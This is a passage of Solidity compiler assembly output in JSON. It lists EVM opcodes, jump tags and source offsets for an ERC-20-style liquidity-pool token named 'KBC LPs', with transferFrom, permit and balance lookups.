											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "AND"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "PUSH [tag]",
											"value": "48"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "tag",
											"value": "13"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "JUMPDEST"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "PUSH [tag]",
											"value": "20"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "PUSH [tag]",
											"value": "50"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "tag",
											"value": "14"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "JUMPDEST"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "PUSH [tag]",
											"value": "26"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "DUP1"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "56"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "56"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "DUP2"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "AND"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "SWAP1"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "ADD"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "PUSH [tag]",
											"value": "57"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "tag",
											"value": "15"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "JUMPDEST"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "PUSH [tag]",
											"value": "58"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "DUP1"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 16,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 17,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "59"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "59"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "DUP2"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "DUP2"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "AND"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "SWAP2"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "DUP2"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "ADD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "SWAP1"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "SWAP2"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "AND"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "SWAP1"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "DUP2"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "ADD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "SWAP1"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "DUP2"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "ADD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "SWAP1"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "DUP3"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "ADD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "AND"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "SWAP1"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "DUP2"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "ADD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "SWAP1"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "PUSH",
											"value": "C0"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "ADD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "PUSH [tag]",
											"value": "60"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "tag",
											"value": "58"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "JUMPDEST"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "STOP"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "tag",
											"value": "16"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "JUMPDEST"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "DUP1"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "62"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "62"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "DUP2"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "DUP2"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "AND"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "SWAP2"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "ADD"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "AND"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "tag",
											"value": "21"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "JUMPDEST"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "MLOAD"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "ADD"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "MSTORE"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP1"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "7"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP2"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "MSTORE"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "ADD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "4B4243204C5073"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "C8"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP2"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "MSTORE"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "POP"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "DUP2"
										},
										{
											"begin": 217,
											"end": 256,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "tag",
											"value": "28"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "JUMPDEST"
										},
										{
											"begin": 2919,
											"end": 2923,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2935,
											"end": 2971,
											"name": "PUSH [tag]",
											"value": "65"
										},
										{
											"begin": 2944,
											"end": 2954,
											"name": "CALLER"
										},
										{
											"begin": 2956,
											"end": 2963,
											"name": "DUP5"
										},
										{
											"begin": 2965,
											"end": 2970,
											"name": "DUP5"
										},
										{
											"begin": 2935,
											"end": 2943,
											"name": "PUSH [tag]",
											"value": "66"
										},
										{
											"begin": 2935,
											"end": 2971,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2935,
											"end": 2971,
											"name": "tag",
											"value": "65"
										},
										{
											"begin": 2935,
											"end": 2971,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 2988,
											"end": 2992,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "tag",
											"value": "64"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "JUMPDEST"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "SWAP3"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "SWAP2"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "POP"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "POP"
										},
										{
											"begin": 2852,
											"end": 2999,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "tag",
											"value": "30"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "JUMPDEST"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "SLOAD"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "DUP2"
										},
										{
											"begin": 349,
											"end": 375,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "tag",
											"value": "33"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "DUP4"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "AND"
										},
										{
											"begin": 3261,
											"end": 3265,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "SWAP1"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "DUP2"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "MSTORE"
										},
										{
											"begin": 3281,
											"end": 3290,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "SWAP1"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "DUP2"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "MSTORE"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "DUP1"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "DUP4"
										},
										{
											"begin": 3281,
											"end": 3296,
											"name": "KECCAK256"
										},
										{
											"begin": 3297,
											"end": 3307,
											"name": "CALLER"
										},
										{
											"begin": 3281,
											"end": 3308,
											"name": "DUP5"
										},
										{
											"begin": 3281,
											"end": 3308,
											"name": "MSTORE"
										},
										{
											"begin": 3281,
											"end": 3308,
											"name": "SWAP1"
										},
										{
											"begin": 3281,
											"end": 3308,
											"name": "SWAP2"
										},
										{
											"begin": 3281,
											"end": 3308,
											"name": "MSTORE"
										},
										{
											"begin": 3281,
											"end": 3308,
											"name": "DUP2"
										},
										{
											"begin": 3281,
											"end": 3308,
											"name": "KECCAK256"
										},
										{
											"begin": 3281,
											"end": 3308,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 3281,
											"end": 3323,
											"name": "EQ"
										},
										{
											"begin": 3277,
											"end": 3448,
											"name": "PUSH [tag]",
											"value": "68"
										},
										{
											"begin": 3277,
											"end": 3448,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "DUP5"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "AND"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "SWAP1"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "DUP2"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "MSTORE"
										},
										{
											"begin": 3369,
											"end": 3378,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "SWAP1"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "DUP2"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "MSTORE"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "DUP1"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "DUP4"
										},
										{
											"begin": 3369,
											"end": 3384,
											"name": "KECCAK256"
										},
										{
											"begin": 3385,
											"end": 3395,
											"name": "CALLER"
										},
										{
											"begin": 3369,
											"end": 3396,
											"name": "DUP5"
										},
										{
											"begin": 3369,
											"end": 3396,
											"name": "MSTORE"
										},
										{
											"begin": 3369,
											"end": 3396,
											"name": "SWAP1"
										},
										{
											"begin": 3369,
											"end": 3396,
											"name": "SWAP2"
										},
										{
											"begin": 3369,
											"end": 3396,
											"name": "MSTORE"
										},
										{
											"begin": 3369,
											"end": 3396,
											"name": "SWAP1"
										},
										{
											"begin": 3369,
											"end": 3396,
											"name": "KECCAK256"
										},
										{
											"begin": 3369,
											"end": 3396,
											"name": "SLOAD"
										},
										{
											"begin": 3369,
											"end": 3437,
											"name": "PUSH [tag]",
											"value": "69"
										},
										{
											"begin": 3369,
											"end": 3437,
											"name": "SWAP1"
										},
										{
											"begin": 3418,
											"end": 3423,
											"name": "DUP4"
										},
										{
											"begin": 3369,
											"end": 3437,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 3369,
											"end": 3400,
											"name": "PUSH [tag]",
											"value": "70"
										},
										{
											"begin": 3369,
											"end": 3437,
											"name": "AND"
										},
										{
											"begin": 3369,
											"end": 3437,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3369,
											"end": 3437,
											"name": "tag",
											"value": "69"
										},
										{
											"begin": 3369,
											"end": 3437,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "DUP6"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "AND"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "SWAP1"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "DUP2"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "MSTORE"
										},
										{
											"begin": 3339,
											"end": 3348,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "SWAP1"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "DUP2"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "MSTORE"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "DUP1"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "DUP4"
										},
										{
											"begin": 3339,
											"end": 3354,
											"name": "KECCAK256"
										},
										{
											"begin": 3355,
											"end": 3365,
											"name": "CALLER"
										},
										{
											"begin": 3339,
											"end": 3366,
											"name": "DUP5"
										},
										{
											"begin": 3339,
											"end": 3366,
											"name": "MSTORE"
										},
										{
											"begin": 3339,
											"end": 3366,
											"name": "SWAP1"
										},
										{
											"begin": 3339,
											"end": 3366,
											"name": "SWAP2"
										},
										{
											"begin": 3339,
											"end": 3366,
											"name": "MSTORE"
										},
										{
											"begin": 3339,
											"end": 3366,
											"name": "SWAP1"
										},
										{
											"begin": 3339,
											"end": 3366,
											"name": "KECCAK256"
										},
										{
											"begin": 3339,
											"end": 3437,
											"name": "SSTORE"
										},
										{
											"begin": 3277,
											"end": 3448,
											"name": "tag",
											"value": "68"
										},
										{
											"begin": 3277,
											"end": 3448,
											"name": "JUMPDEST"
										},
										{
											"begin": 3457,
											"end": 3483,
											"name": "PUSH [tag]",
											"value": "71"
										},
										{
											"begin": 3467,
											"end": 3471,
											"name": "DUP5"
										},
										{
											"begin": 3473,
											"end": 3475,
											"name": "DUP5"
										},
										{
											"begin": 3477,
											"end": 3482,
											"name": "DUP5"
										},
										{
											"begin": 3457,
											"end": 3466,
											"name": "PUSH [tag]",
											"value": "72"
										},
										{
											"begin": 3457,
											"end": 3483,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3457,
											"end": 3483,
											"name": "tag",
											"value": "71"
										},
										{
											"begin": 3457,
											"end": 3483,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 3500,
											"end": 3504,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "SWAP4"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "SWAP3"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "POP"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "POP"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "POP"
										},
										{
											"begin": 3150,
											"end": 3511,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 698,
											"end": 814,
											"name": "tag",
											"value": "35"
										},
										{
											"begin": 698,
											"end": 814,
											"name": "JUMPDEST"
										},
										{
											"begin": 748,
											"end": 814,
											"name": "PUSH",
											"value": "6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9"
										},
										{
											"begin": 698,
											"end": 814,
											"name": "DUP2"
										},
										{
											"begin": 698,
											"end": 814,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "tag",
											"value": "37"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "JUMPDEST"
										},
										{
											"begin": 341,
											"end": 343,
											"name": "PUSH",
											"value": "12"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "DUP2"
										},
										{
											"begin": 308,
											"end": 343,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 557,
											"end": 588,
											"name": "tag",
											"value": "39"
										},
										{
											"begin": 557,
											"end": 588,
											"name": "JUMPDEST"
										},
										{
											"begin": 557,
											"end": 588,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 557,
											"end": 588,
											"name": "SLOAD"
										},
										{
											"begin": 557,
											"end": 588,
											"name": "DUP2"
										},
										{
											"begin": 557,
											"end": 588,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "tag",
											"value": "42"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "JUMPDEST"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "PUSH",
											"value": "3"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "MSTORE"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "SWAP1"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "DUP2"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "MSTORE"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "SWAP1"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "KECCAK256"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "SLOAD"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "DUP2"
										},
										{
											"begin": 501,
											"end": 550,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "tag",
											"value": "45"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "JUMPDEST"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "MSTORE"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "SWAP1"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "DUP2"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "MSTORE"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "SWAP1"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "KECCAK256"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "SLOAD"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "DUP2"
										},
										{
											"begin": 381,
											"end": 425,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "tag",
											"value": "48"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "JUMPDEST"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "PUSH",
											"value": "5"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "MSTORE"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "SWAP1"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "DUP2"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "MSTORE"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "SWAP1"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "KECCAK256"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "SLOAD"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "DUP2"
										},
										{
											"begin": 820,
											"end": 861,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "tag",
											"value": "50"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "JUMPDEST"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "MLOAD"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "DUP1"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 262,
											"end": 302,
